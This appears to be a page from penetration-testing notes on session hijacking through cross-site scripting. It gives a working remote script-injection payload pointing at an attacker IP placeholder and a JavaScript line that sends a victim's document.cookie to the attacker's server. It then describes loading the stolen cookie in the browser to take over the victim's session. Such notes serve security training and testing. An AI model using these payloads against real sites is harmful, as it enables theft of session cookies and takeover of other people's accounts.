# Session Hijacking

After we have identified a working remote XSS payload and the vulnerable input field, only then we can perform a session hijacking attack (See Blind XSS to discover working remote payloads).

Working malicious remote payload

Copy

```
<script src=http://OUR_IP/script.js></script> # IP and PORT of the PHP server
```

Now execute the malicious payload above to call the malicious script below which will be hosted on our PHP server, which will send a cookie to our self-hosted netcat server when the victim visits the vulnerable page (Start PHP & netcat servers in advance).

Hosting a malicious cookie grabbing script on our machine

Copy

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

We can add the grabbed cookie to Storage in Dev Tools, and reload a /login.php page to get access to that victim's session.

[**Direct link to heading**](session-hijacking.md#refining-the-attack) **Refining the Attack**

There might be many victim cookies that get routed to our server. We can write a PHP script to order them and more. We can save the script as index.php. Once a victim visits the vulnerable page we will get two requests now in our server.

[PreviousBlind XSS](../../../../../blind-xss.md) [NextCommon Web Applications](../../../../../common-web-applications.md)

Last updated 3 days ago
